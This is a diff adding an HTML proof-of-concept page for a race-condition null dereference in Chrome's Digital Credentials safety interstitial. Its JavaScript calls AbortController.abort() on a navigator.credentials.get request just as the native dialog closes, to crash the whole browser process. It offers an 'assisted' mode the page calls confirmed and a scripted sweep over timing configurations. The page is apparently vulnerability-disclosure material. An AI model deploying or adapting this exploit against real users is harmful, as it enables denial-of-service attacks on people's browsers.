@@ -1,0 +1,229 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>DC Interstitial Abort Null-Deref PoC v2</title>
+<style>
+body{font-family:sans-serif;max-width:760px;margin:40px auto;padding:0 16px;color:#111;line-height:1.5}
+button{font-size:20px;padding:12px 26px;cursor:pointer}
+button:disabled{opacity:.5;cursor:default}
+#log{white-space:pre-wrap;font-size:12px;background:#111;color:#0f0;padding:10px;height:280px;overflow:auto;border-radius:6px}
+.row{display:flex;gap:10px;align-items:center;margin:10px 0;flex-wrap:wrap}
+.pill{font-family:monospace;font-size:12px;background:#eee;padding:4px 10px;border-radius:999px}
+.mode{border:1px solid #ccc;border-radius:8px;padding:10px 14px;margin:8px 0}
+.mode.active{border-color:#2f6b4f;background:#f3faf6}
+small{color:#555}
+code{background:#eee;padding:1px 5px;border-radius:4px}
+</style>
+</head>
+<body>
+<h1 id="status">DC interstitial <code>Abort()</code> null-deref &mdash; PoC v2</h1>
+<p>
+  <b>Mechanism:</b> <code>DigitalIdentitySafetyInterstitialControllerDesktop::Abort()</code> dereferences
+  <code>dialog_widget_</code> with no null check. <code>dialog_widget_</code> is set to <code>nullptr</code>
+  <em>synchronously</em> the instant the native interstitial dialog closes (any cause), but the owning
+  controller object is destroyed only by a <em>posted</em> task that runs slightly later. If this page's
+  <code>AbortController.abort()</code> reaches the browser process inside that gap, the whole browser
+  process crashes. See <code>../report.md</code> for the full write-up.
+</p>
+
+<div class="row">
+  <label><input type="radio" name="mode" value="assisted" checked> <b>Assisted</b> &mdash; arms on <code>focus</code>/<code>visibilitychange</code> after a real click on the dialog. <small>(proven: this is the variant that produced the confirmed crash.)</small></label>
+</div>
+<div class="row">
+  <label><input type="radio" name="mode" value="blind"> <b>Blind sweep</b> &mdash; fully scripted, no manual dialog interaction at all. Races a scripted <code>location.replace()</code> (a real navigation, which eventually closes the dialog asynchronously) against <code>controller.abort()</code>, sweeping delay &times; ordering automatically across successive trials. <small>(earlier ad-hoc version: 0/10. This sweeps a much wider, systematic grid &mdash; run it as many times as you like.)</small></label>
+</div>
+
+<div id="assistedBox" class="mode active">
+  <b>Assisted steps:</b>
+  <ol>
+    <li>Click <b>START</b> (the one real click <code>navigator.credentials.get()</code> needs).</li>
+    <li>Wait for the native &ldquo;share your identity with this site?&rdquo; dialog.</li>
+    <li>Click its own <b>Go back</b> button (or press <kbd>Esc</kbd>) &mdash; a real, OS-level close.</li>
+    <li>The page fires <code>controller.abort()</code> the instant focus/visibility returns. If it lands in the gap, Chrome crashes immediately.</li>
+  </ol>
+</div>
+
+<div id="blindBox" class="mode">
+  <b>Blind sweep steps:</b>
+  <ol>
+    <li>Click <b>START</b>. No further interaction &mdash; the script alone fires the navigation+abort race at the current sweep config.</li>
+    <li>Watch for a crash (whole browser dies / relaunches). If nothing crashes, the log will show <code>request settled: ...</code> and the config index auto-advances.</li>
+    <li>Click <b>START</b> again for the next config in the sweep (a fresh real click is required every time &mdash; the API consumes transient activation per call, this cannot be looped without a click).</li>
+    <li>If Chrome crashes mid-trial, the <em>last</em> log line before the crash (persisted to <code>localStorage</code>, survives the crash/relaunch) tells you exactly which config did it.</li>
+  </ol>
+  <small>Current sweep grid: delays {10, 25, 50, 75, 100, 150, 200, 300, 450, 700, 900, 1300, 1800} ms &times; orderings {abort-then-navigate, navigate-then-abort} = 26 configs, cycling forever.</small>
+</div>
+
+<div class="row">
+  <button id="go">START</button>
+  <span class="pill" id="trial">trial: 0</span>
+  <span class="pill" id="armedState">idle</span>
+  <span class="pill" id="cfg"></span>
+</div>
+<div class="row">
+  <button id="copyLog">Copy full log + UA</button>
+  <button id="clearLog">Clear saved log</button>
+  <button id="resetSweep">Reset sweep index to 0</button>
+</div>
+<pre id="log"></pre>
+
+<script>
+/*
+ * PoC for: DigitalIdentitySafetyInterstitialControllerDesktop::Abort()
+ * chrome/browser/ui/views/digital_credentials/digital_identity_safety_interstitial_controller_desktop.cc
+ *
+ *   void DigitalIdentitySafetyInterstitialControllerDesktop::Abort() {
+ *     if (!web_contents_) { return; }
+ *     dialog_widget_->CloseWithReason(...);   // <-- no null check
+ *     ShowInterstitialImpl(/*was_request_aborted=*\/true);
+ *   }
+ *
+ * OnDialogClosed() sets dialog_widget_ = nullptr SYNCHRONOUSLY the moment the
+ * dialog closes (any cause: button click, Esc, or the WebContentsModalDialogManager
+ * closing it on navigation), then posts a task that tears down the owning
+ * controller. Abort(), invoked via DigitalIdentityRequestImpl::Abort() over Mojo
+ * when this page's AbortController fires .abort(), dereferences the already-null
+ * dialog_widget_ if it runs inside that gap.
+ *
+ * Two independent ways to try to land the race, both in this file:
+ *
+ *   "assisted" - the proven mechanism. A real click/Esc closes the dialog;
+ *   window.onfocus / visibilitychange fire the instant focus returns to the
+ *   page, which is a tight, event-driven proxy for "the dialog just closed."
+ *   This is the variant that produced the confirmed crash.
+ *
+ *   "blind" - fully scripted, no manual dialog interaction. location.replace()
+ *   triggers a real navigation, which the WebContentsModalDialogManager closes
+ *   the open dialog for -- but ASYNCHRONOUSLY, through its own indirection after
+ *   DidStartNavigation, not instantly. An earlier ad-hoc version of this (fixed
+ *   delays 10-900ms, both firing orders, ~10 trials) saw zero crashes, most
+ *   likely because the scripted abort() essentially always lands before the
+ *   navigation has actually finished closing the dialog. This version sweeps a
+ *   much larger, systematic delay x ordering grid across however many trials
+ *   you run, auto-advancing and persisting progress, instead of a handful of
+ *   guesses. Still may simply not be achievable without the real IPC/task
+ *   timing of a genuine dialog close that the assisted mode provides -- treat a
+ *   long clean sweep as a legitimate negative result, not a tooling failure.
+ */
+
+const LOG_KEY = 'dc_abort_poc_log_v2';
+const SWEEP_KEY = 'dc_abort_poc_sweep_idx_v2';
+
+const DELAYS = [10, 25, 50, 75, 100, 150, 200, 300, 450, 700, 900, 1300, 1800];
+const ORDERS = ['abort-then-navigate', 'navigate-then-abort'];
+const SWEEP = DELAYS.flatMap(d => ORDERS.map(o => ({ delay: d, order: o })));
+
+function loadLog() { try { return JSON.parse(localStorage.getItem(LOG_KEY) || '[]'); } catch (e) { return []; } }
+function saveLog(entries) { try { localStorage.setItem(LOG_KEY, JSON.stringify(entries)); } catch (e) {} }
+function loadSweepIdx() { try { return parseInt(localStorage.getItem(SWEEP_KEY) || '0', 10) || 0; } catch (e) { return 0; } }
+function saveSweepIdx(i) { try { localStorage.setItem(SWEEP_KEY, String(i)); } catch (e) {} }
+
+let entries = loadLog();
+let sweepIdx = loadSweepIdx();
+let trialNum = entries.reduce((m, e) => Math.max(m, e.trial || 0), 0);
+
+function render() {
+  const el = document.getElementById('log');
+  el.textContent = entries.map(e => `[${e.t}] trial#${e.trial} ${e.msg}`).join('\n');
+  el.scrollTop = el.scrollHeight;
+  document.getElementById('trial').textContent = 'trial: ' + trialNum;
+}
+function log(msg, trial) {
+  const e = { t: new Date().toISOString(), trial: trial ?? trialNum, msg };
+  entries.push(e);
+  if (entries.length > 1000) entries = entries.slice(-1000);
+  saveLog(entries);
+  render();
+}
+if (entries.length) log('--- page (re)loaded, resuming persisted log ---');
+else render();
+
+let controller = null;
+let armed = false;
+let mode = 'assisted';
+
+function setArmedUi(s) { document.getElementById('armedState').textContent = s; }
+
+function fireAbort(source) {
+  if (!armed || !controller) return;
+  armed = false;
+  setArmedUi('fired via ' + source);
+  log('>>> ' + source + ' fired -- calling controller.abort() now');
+  try { controller.abort(); } catch (e) { log('abort() threw: ' + e); }
+}
+
+window.addEventListener('focus', () => { if (mode === 'assisted') fireAbort('window focus'); });
+document.addEventListener('visibilitychange', () => {
+  if (mode === 'assisted' && document.visibilityState === 'visible') fireAbort('visibilitychange');
+});
+
+function startRequest(protocolSuffix) {
+  controller = new AbortController();
+  return navigator.credentials.get({
+    digital: { requests: [{ protocol: 'dc-abort-race-poc-' + protocolSuffix, data: { probe: true } }] },
+    signal: controller.signal
+  });
+}
+
+function runAssisted() {
+  trialNum++;
+  armed = true;
+  setArmedUi('armed -- waiting for dialog close');
+  log('request started -- click "Go back" (or Esc) on the native dialog now', trialNum);
+  startRequest('assisted')
+    .then(() => log('request resolved (unexpected)', trialNum))
+    .catch(e => log('request settled: ' + e.name + (e.message ? ' -- ' + e.message : ''), trialNum));
+}
+
+function runBlind() {
+  trialNum++;
+  const cfg = SWEEP[sweepIdx % SWEEP.length];
+  document.getElementById('cfg').textContent = `cfg: delay=${cfg.delay}ms order=${cfg.order} (#${sweepIdx % SWEEP.length + 1}/${SWEEP.length})`;
+  setArmedUi('running blind config');
+  log(`attempting blind config delay=${cfg.delay}ms order=${cfg.order}`, trialNum);
+
+  const p = startRequest('blind').catch(e => log('request settled: ' + e.name + (e.message ? ' -- ' + e.message : ''), trialNum));
+
+  setTimeout(() => {
+    if (cfg.order === 'abort-then-navigate') {
+      log('firing: abort() then location.replace()', trialNum);
+      try { controller.abort(); } catch (e) { log('abort() threw: ' + e); }
+      try { location.replace(location.href); } catch (e) { log('location.replace() threw: ' + e); }
+    } else {
+      log('firing: location.replace() then abort()', trialNum);
+      try { location.replace(location.href); } catch (e) { log('location.replace() threw: ' + e); }
+      try { controller.abort(); } catch (e) { log('abort() threw: ' + e); }
+    }
+  }, cfg.delay);
+
+  sweepIdx = (sweepIdx + 1) % SWEEP.length;
+  saveSweepIdx(sweepIdx);
+}
+
+document.getElementById('go').addEventListener('click', () => {
+  if (mode === 'assisted') runAssisted();
+  else runBlind();
+});
+
+document.querySelectorAll('input[name=mode]').forEach(r => {
+  r.addEventListener('change', () => {
+    mode = document.querySelector('input[name=mode]:checked').value;
+    document.getElementById('assistedBox').classList.toggle('active', mode === 'assisted');
+    document.getElementById('blindBox').classList.toggle('active', mode === 'blind');
+    document.getElementById('cfg').textContent = mode === 'blind'
+      ? `cfg: delay=${SWEEP[sweepIdx % SWEEP.length].delay}ms order=${SWEEP[sweepIdx % SWEEP.length].order} (#${sweepIdx % SWEEP.length + 1}/${SWEEP.length})`
+      : '';
+  });
+});
+
+document.getElementById('copyLog').addEventListener('click', async () => {
+  const text = 'UA: ' + navigator.userAgent + '\n' + entries.map(e => `[${e.t}] trial#${e.trial} ${e.msg}`).join('\n');
+  try { await navigator.clipboard.writeText(text); document.getElementById('status').textContent = 'DC interstitial PoC v2 -- log copied to clipboard'; }
+  catch (e) { alert(text); }
+});
+document.getElementById('clearLog').addEventListener('click', () => { entries = []; trialNum = 0; saveLog(entries); render(); });
+document.getElementById('resetSweep').addEventListener('click', () => { sweepIdx = 0; saveSweepIdx(0); document.querySelector('input[name=mode][value=blind]').dispatchEvent(new Event('change')); });
+</script>
+</body>
+</html>
